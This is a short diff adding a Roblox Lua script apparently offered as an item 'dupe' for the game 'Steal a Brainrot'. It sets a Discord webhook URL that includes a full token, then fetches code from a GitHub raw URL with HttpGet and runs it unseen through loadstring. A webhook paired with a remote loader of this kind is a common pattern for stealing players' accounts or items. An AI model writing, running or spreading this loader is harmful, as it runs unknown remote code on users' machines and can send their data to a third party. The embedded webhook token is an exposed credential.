@@ -1,0 +1,3 @@
+local webhook = "https://discord.com/api/webhooks/1422262979763769495/NVFwR91FK1Lvo3kzQXcmzeRf6DGXWuMnM-9l4XsXtYTs1TRKjlHMxT7bKq_DohgX9LYl"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DupeSab/StealABrainrot/refs/heads/main/Dupe", true))()
